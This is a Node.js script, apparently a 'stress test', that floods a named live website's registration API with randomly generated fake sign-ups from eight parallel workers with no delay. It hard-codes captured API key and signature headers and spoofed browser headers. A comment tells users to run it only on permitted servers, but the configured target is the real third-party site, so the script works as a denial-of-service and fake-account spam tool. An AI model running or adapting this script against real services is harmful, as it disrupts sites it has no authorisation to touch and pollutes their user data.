// stress-random-form.js
// Node >=18 (global fetch). LEGAL: CHỈ chạy trên server bạn sở hữu / có phép.
// Usage: node stress-random-form.js

const { Worker, isMainThread, parentPort, workerData } = require('node:worker_threads');
const { performance } = require('node:perf_hooks');

/////////////////////
// CONFIG - chỉnh ở đây
/////////////////////
const headers = { 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en,en-US;q=0.9,vi;q=0.8', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://connecttripau.com', 'Referer': 'https://connecttripau.com/register', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'X-Api-Digest': 'EY1gEjMHqv1Qb30Eha5iBVf6CTIb2xQ7zvp58vU64Q9LC%2FbFmakQda2T4803S1D2wOLEAEkWO8XIerJFbG7MVZaEn1BfJH3rfeZd6E78DgNnwZMQgWKkko8Q1uWSwAVj3bwqn5%2B5kWprLx%2BOn9%2BgNkSRaAOgI4c%2BbtS6dupe2CM%3D', 'X-Api-Key': '1612703a0fef43daa6d60b39fdc84164', 'X-Api-Language': 'en', 'X-Api-Nonce': 'ad9ce18f8d27021b0b10c3c9237888b3', 'X-Api-Signature': '70608e3bd203e36422b4844938b2a552d78364c755ad5b02fa035a81bf875eee', 'X-Api-Signature-Method': 'HmacSHA256', 'X-Api-Signature-Params': 'code,password,security,tel,username', 'X-Api-Terminal': 'Other', 'X-Api-Timestamp': '1759378275132', 'X-Api-Version': '1.0.0', 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"' };

const CONFIG = {
    TARGET: 'https://connecttripau.com/api/cat/v1/auth/register', // <- đổi thành staging/local only. KHÔNG dùng trực tiếp lên site không có phép
    CONCURRENCY: 8, // số worker threads
    DURATION_SEC: 30, // thời gian chạy
    REQUESTS_PER_WORKER_LOOP_DELAY_MS: 0, // 0 = càng nhanh càng nhiều request
    HEADERS: headers,
};

if (isMainThread) {
    // main: spawn workers
    console.log('CONFIG (ensure target is staging/local or you have permission):', {
        target: CONFIG.TARGET,
        concurrency: CONFIG.CONCURRENCY,
        duration: CONFIG.DURATION_SEC,
    });

    const stopAt = performance.now() + CONFIG.DURATION_SEC * 1000;
    let stats = { requests: 0, success: 0, fail: 0, latencies: [] };

    const workers = [];
    for (let i = 0; i < CONFIG.CONCURRENCY; i++) {
        const w = new Worker(__filename, {
            workerData: {
                target: CONFIG.TARGET,
                headers: CONFIG.HEADERS,
                stopAt,
                delayMs: CONFIG.REQUESTS_PER_WORKER_LOOP_DELAY_MS,
            },
        });
        w.on('message', (m) => {
            if (m.type === 'stat') {
                stats.requests += m.requests || 0;
                stats.success += m.success || 0;
                stats.fail += m.fail || 0;
                if (Array.isArray(m.latencies)) stats.latencies.push(...m.latencies);
            }
        });
        w.on('error', (e) => console.error('Worker error:', e));
        workers.push(w);
    }

    // simple progress print
    const iv = setInterval(() => {
        const elapsed = Math.max(
            0,
            CONFIG.DURATION_SEC - Math.round((stopAt - performance.now()) / 1000),
        );
        const rps = (stats.requests / Math.max(1, elapsed)).toFixed(1);
        process.stdout.write(
            `\rrequests: ${stats.requests}  success: ${stats.success}  fail: ${stats.fail}  RPS≈${rps}      `,
        );
    }, 1000);

    // when time passed, ask workers to send final stats and exit
    setTimeout(async () => {
        for (const w of workers) w.postMessage({ cmd: 'stop' });
        // wait short to gather stats
        setTimeout(() => {
            clearInterval(iv);
            // compute basic latencies
            const flat = stats.latencies.sort((a, b) => a - b);
            const pct = (p) => {
                if (!flat.length) return 0;
                const idx = Math.floor((p / 100) * flat.length);
                return flat[Math.min(flat.length - 1, Math.max(0, idx))].toFixed(2);
            };
            const mean = flat.length
                ? (flat.reduce((s, a) => s + a, 0) / flat.length).toFixed(2)
                : 0;
            console.log('\n\n=== RESULT ===');
            console.log(`Total requests: ${stats.requests}`);
            console.log(`Success: ${stats.success}, Fail: ${stats.fail}`);
            console.log(`Duration (s): ${CONFIG.DURATION_SEC}`);
            console.log(`Approx RPS: ${(stats.requests / CONFIG.DURATION_SEC).toFixed(2)}`);
            console.log(`Latency ms: mean=${mean}, p50=${pct(50)}, p95=${pct(95)}, p99=${pct(99)}`);
            process.exit(0);
        }, 800);
    }, CONFIG.DURATION_SEC * 1000 + 200);
} else {
    // worker thread: loop until stopAt
    const { target, headers, stopAt, delayMs } = workerData;
    const url = target;
    let localStats = { requests: 0, success: 0, fail: 0, latencies: [] };
    let running = true;

    parentPort.on('message', (m) => {
        if (m.cmd === 'stop') running = false;
    });

    // random generators
    const rand = (n) => Math.floor(Math.random() * n);
    const randHex = (len = 6) =>
        [...Array(len)].map(() => Math.floor(rand(16)).toString(16)).join('');
    const randomUsername = () => `u_${Date.now().toString(36)}${randHex(4)}`;
    function pickRandom(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    const randomEmail = (u) => `${u}@${pickRandom(['example.local','gmail.com','hotmail.com','yopmail.com','mail.tech',])}`;

    const encodeForm = (obj) => {
        return new URLSearchParams(obj).toString();
    };

    (async function loop() {
        while (running && performance.now() < stopAt) {
            const u = randomUsername();
            const form = {
                username: u,
                tel: randomEmail(u), // per your example using tel as email
                password: `${u}@12aA`,
                security: `${u}@aA43`,
                code: String(117527), // static example, change if needed
            };
            const body = encodeForm(form);
            // console.log("🚀 ~ loop ~ body:", body)
            const s = performance.now();
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body,
                });
                const text = await res.text(); // drain
                console.log("🚀 ~ loop ~ text:", text)
                const latency = performance.now() - s;
                localStats.requests += 1;
                localStats.latencies.push(latency);
                if (res.ok) localStats.success += 1;
                else localStats.fail += 1;
            } catch (e) {
                localStats.requests += 1;
                localStats.fail += 1;
            }

            // flush stats periodically to main
            if (localStats.requests >= 50) {
                parentPort.postMessage({ type: 'stat', ...localStats });
                localStats = { requests: 0, success: 0, fail: 0, latencies: [] };
            }

            if (delayMs) await new Promise((r) => setTimeout(r, delayMs));
        }

        // final flush
        parentPort.postMessage({ type: 'stat', ...localStats });
        parentPort.close();
    })();
}
